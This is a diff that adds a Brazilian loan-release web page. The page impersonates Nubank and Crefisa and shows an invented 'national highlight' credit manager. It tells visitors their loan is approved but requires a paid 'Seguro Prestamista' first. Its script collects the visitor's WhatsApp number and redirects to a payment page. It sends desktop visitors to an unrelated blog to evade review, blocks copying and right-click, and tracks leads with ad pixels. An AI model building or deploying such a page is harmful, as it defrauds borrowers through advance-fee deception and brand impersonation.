@@ -1,0 +1,649 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5HHS3G78');</script>
+<!-- End Google Tag Manager -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nubank - Liberação de Empréstimo</title>
+
+  <style>
+    :root {
+      --primary: #9903d6;
+      --primary-light: #b347e8;
+      --primary-dark: #7a02a8;
+      --bg: #f8f9fa;
+      --card: #fff;
+      --text: #1f2937;
+      --text-light: #6b7280;
+      --success: #16a34a;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --radius: 16px;
+      --shadow: 0 4px 20px rgba(153, 3, 214, 0.08);
+      --shadow-lg: 0 8px 32px rgba(153, 3, 214, 0.12);
+      --shadow-xl: 0 20px 40px rgba(153, 3, 214, 0.15);
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+  /* Ajuste para colar o card no verde */
+  .success-header {
+    margin-bottom: 0 !important;
+    padding-bottom: 0 !important;
+  }
+
+  .main-container {
+    margin-top: 0 !important;
+    padding-top: 0 !important;
+  }
+
+  .content-card {
+    margin-top: 0 !important;
+  }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: linear-gradient(135deg, var(--bg) 0%, #e2e8f0 100%);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      line-height: 1.6;
+      min-height: 100vh;
+      overflow-x: hidden;
+      user-select: none;
+    }
+
+    /* Header Unificado */
+    .header-container {
+      top: 0;
+      left: 0;
+      width: 100%;
+      z-index: 1000;
+    }
+
+    .navbar {
+      background: var(--primary);
+      padding: 16px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .navbar img {
+      height: 35px;
+      width: auto;
+    }
+
+    .success-header {
+      background: linear-gradient(135deg, #00c851 0%, #00a841 100%);
+      color: white;
+      text-align: center;
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+    }
+
+    .success-header::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      animation: shimmer 2s infinite;
+    }
+
+    @keyframes shimmer {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+
+    .success-badge {
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      padding: 8px 20px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      display: inline-block;
+      margin-bottom: 8px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .success-title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin: 0;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* Main Container */
+    .main-container {
+      margin-top: 0px;
+      min-height: calc(100vh - 100px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0px;
+    }
+
+    .content-card {
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-xl);
+      padding: 32px 24px;
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(153, 3, 214, 0.08);
+      animation: slideUp 0.6s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* Profile Section */
+    .profile-section {
+      margin-bottom: 24px;
+      animation: slideUp 0.6s ease-out 0.2s both;
+    }
+
+    .profile-photo {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin: 0 auto 16px;
+      border: 3px solid var(--primary);
+      box-shadow: 0 8px 25px rgba(153, 3, 214, 0.2);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.02); }
+    }
+
+    .manager-info h3 {
+      color: var(--text);
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+
+    .manager-role {
+      color: var(--text-light);
+      font-size: 1rem;
+      margin-bottom: 12px;
+    }
+
+    .highlight-badge {
+      background: linear-gradient(135deg, #f59e0b, #d97706);
+      color: white;
+      padding: 6px 16px;
+      border-radius: 15px;
+      font-size: 12px;
+      font-weight: 600;
+      display: inline-block;
+      box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
+    }
+
+    /* Content Section */
+    .content-section {
+      margin-bottom: 24px;
+      animation: slideUp 0.6s ease-out 0.4s both;
+    }
+
+    .content-section p {
+      color: var(--text-light);
+      margin-bottom: 16px;
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+
+    .important-text {
+      background: linear-gradient(135deg, #f0f9ff, #e0f2fe);
+      border: 2px solid rgba(153, 3, 214, 0.2);
+      border-radius: 12px;
+      padding: 16px;
+      margin: 20px 0;
+      font-weight: 600;
+      color: var(--text);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .important-text::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 4px;
+      height: 100%;
+      background: var(--primary);
+    }
+
+    /* Form Section */
+    .form-section {
+      margin-top: 24px;
+      animation: slideUp 0.6s ease-out 0.6s both;
+    }
+
+    .form-group {
+      text-align: left;
+      margin-bottom: 24px;
+    }
+
+    .form-label {
+      display: block;
+      color: var(--text);
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      text-align: center;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 18px;
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      font-size: 16px;
+      background: #fff;
+      color: var(--text);
+      transition: var(--transition);
+      text-align: center;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(153, 3, 214, 0.1);
+      transform: translateY(-1px);
+    }
+
+    .form-input.success {
+      border-color: var(--success);
+      background-color: #f0fdf4;
+    }
+
+    .form-input.error {
+      border-color: var(--danger);
+      box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
+    }
+
+    .error-message {
+      color: var(--danger);
+      font-size: 12px;
+      margin-top: 8px;
+      display: none;
+      text-align: center;
+    }
+
+    /* Submit Button */
+    .submit-btn {
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition);
+      position: relative;
+      overflow: hidden;
+      box-shadow: var(--shadow-lg);
+    }
+
+    .submit-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s;
+    }
+
+    .submit-btn:hover::before {
+      left: 100%;
+    }
+
+    .submit-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 35px rgba(153, 3, 214, 0.4);
+    }
+
+    .submit-btn:active {
+      transform: translateY(0);
+    }
+
+    .submit-btn:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Loading State */
+    .loading {
+      opacity: 0.7;
+      pointer-events: none;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid transparent;
+      border-top: 2px solid currentColor;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-right: 8px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Mobile Optimizations */
+    @media (max-width: 768px) {
+      .main-container {
+        margin-top: 120px;
+      }
+      
+      .content-card {
+        margin: 0px;
+        padding: 24px 20px;
+      }
+      
+      .navbar {
+        padding: 15px 4%;
+      }
+      
+      .success-header {
+        padding: 16px;
+      }
+      
+      .success-title {
+        font-size: 1.3rem;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .profile-photo {
+        width: 80px;
+        height: 80px;
+      }
+      
+      .manager-info h3 {
+        font-size: 1.3rem;
+      }
+      
+      .form-input {
+        padding: 16px;
+        font-size: 16px;
+      }
+      
+      .submit-btn {
+        padding: 16px;
+        font-size: 1rem;
+      }
+    }
+
+    /* Accessibility */
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+
+    /* Focus States */
+    .form-input:focus,
+    .submit-btn:focus {
+      outline: 2px solid var(--primary);
+      outline-offset: 2px;
+    }
+
+    /* High Contrast Mode */
+    @media (prefers-contrast: high) {
+      :root {
+        --primary: #7a02a8;
+        --text: #000;
+        --text-light: #333;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Header Unificado -->
+  <div class="header-container">
+    <nav class="navbar">
+      <div><img src="images/crefisa.png" alt="Logo"></div>
+      <div></div>
+    </nav>
+    <div class="success-header">
+      <div class="success-badge">✓ Crédito Aprovado</div>
+      <h1 class="success-title">Liberação em Andamento</h1>
+    </div>
+  </div>
+
+  <!-- Main Container -->
+  <div class="main-container">
+    <div class="content-card">
+      <!-- Profile Section -->
+      <div class="profile-section">
+        <img src="images/manager.jpg" alt="Carla Martins" class="profile-photo">
+        <div class="manager-info">
+          <h3>Carla Martins</h3>
+          <div class="manager-role">Gerente de Crédito Pessoal</div>
+          <div class="highlight-badge">🏆 Destaque Nacional 2024</div>
+        </div>
+      </div>
+
+      <!-- Content Section -->
+      <div class="content-section">
+        <p>Carla é a responsável por acompanhar com segurança a liberação do seu empréstimo.</p>
+        <div class="important-text">Seu valor foi aprovado e está em fase final de liberação.</div>
+        <p>Apenas um passo obrigatório está pendente: a contratação do <strong>Seguro Prestamista</strong>, exigida para validação bancária e ativar o seguro obrigatório da operação.</p>
+      </div>
+
+      <!-- Form Section -->
+      <div class="form-section">
+        <div class="form-group">
+          <label for="telefone" class="form-label">Digite seu WhatsApp para continuar e finalize a contratação do seguro para liberar seu empréstimo:</label>
+          <input type="text" id="telefone" class="form-input" placeholder="(00) 00000-0000" maxlength="15">
+          <div class="error-message" id="telefone-error">Digite um WhatsApp válido</div>
+        </div>
+        
+        <button id="submitBtn" class="submit-btn">
+          <span class="btn-text">🔒 Concluir Liberação</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script>
+    // Initialize page
+    document.addEventListener('DOMContentLoaded', function() {
+      // Desktop redirect
+      if (window.innerWidth >= 1024) {
+        window.location.href = "https://atendimentoonline.store/blog/";
+        return;
+      }
+
+      // Security measures
+      document.addEventListener('contextmenu', e => e.preventDefault());
+      document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && (e.key === 'c' || e.key === 'v')) {
+          e.preventDefault();
+        }
+      });
+
+      // Setup form validation
+      setupFormValidation();
+      
+      // Auto-focus first input on mobile
+      if (window.innerWidth <= 768) {
+        setTimeout(() => {
+          document.getElementById('telefone').focus();
+        }, 500);
+      }
+
+      // Prevent zoom on iOS
+      const inputs = document.querySelectorAll('.form-input');
+      inputs.forEach(input => {
+        input.addEventListener('focus', function() {
+          document.querySelector('meta[name=viewport]').setAttribute(
+            'content', 
+            'width=device-width, initial-scale=1, maximum-scale=1'
+          );
+        });
+        
+        input.addEventListener('blur', function() {
+          document.querySelector('meta[name=viewport]').setAttribute(
+            'content', 
+            'width=device-width, initial-scale=1'
+          );
+        });
+      });
+    });
+
+    // Form validation setup
+    function setupFormValidation() {
+      const telefoneInput = document.getElementById('telefone');
+      const submitBtn = document.getElementById('submitBtn');
+
+      // Phone mask
+      telefoneInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 11) value = value.slice(0, 11);
+        e.target.value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+        validateField(this);
+      });
+
+      // Submit button
+      submitBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        const telefoneValid = validateField(telefoneInput);
+        
+        if (!telefoneValid) {
+          telefoneInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          telefoneInput.focus();
+          return;
+        }
+
+        // Save data and redirect
+        localStorage.setItem('telefone', telefoneInput.value);
+        
+        // Add loading state
+        this.innerHTML = '<div class="spinner"></div>Processando...';
+        this.disabled = true;
+        
+        // Redirect with UTM parameters
+        setTimeout(() => {
+          redirecionarPagamento();
+        }, 1000);
+      });
+    }
+
+    // Field validation
+    function validateField(field) {
+      const value = field.value.trim();
+      const errorElement = document.getElementById(field.id + '-error');
+      
+      const cleanPhone = value.replace(/\D/g, '');
+      const isValid = cleanPhone.length >= 10;
+      
+      errorElement.textContent = isValid ? '' : 'Digite um WhatsApp válido (mín. 10 dígitos)';
+      
+      // Update field appearance
+      field.classList.remove('success', 'error');
+      if (value) {
+        field.classList.add(isValid ? 'success' : 'error');
+        errorElement.style.display = isValid ? 'none' : 'block';
+      } else {
+        errorElement.style.display = 'none';
+      }
+      
+      return isValid;
+    }
+
+    // Redirect function
+    function redirecionarPagamento() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmParams = urlParams.toString();
+      let redirectUrl = '../pagar-pac-3500/index.html';
+      if (utmParams) {
+        redirectUrl += '?' + utmParams;
+      }
+      window.location.href = redirectUrl;
+    }
+  </script>
+<!-- Pixel Meta + UTMify com deduplicação -->
+<script>
+  // Gera um eventID único para deduplicação
+  const eventId = 'page-' + Date.now();
+
+  // --- Meta Pixel ---
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+  
+  fbq('init', '1607974976562499');
+  fbq('track', 'Lead', {}, {eventID: eventId});
+
+  // --- UTMify Pixel ---
+  window.pixelId = "684c7d3bb21e8e0cccb36251";
+  window.eventID = eventId; // mesmo ID para deduplicação
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1607974976562499&ev=PageView&noscript=1"/>
+</noscript>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5HHS3G78"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+</body></html>
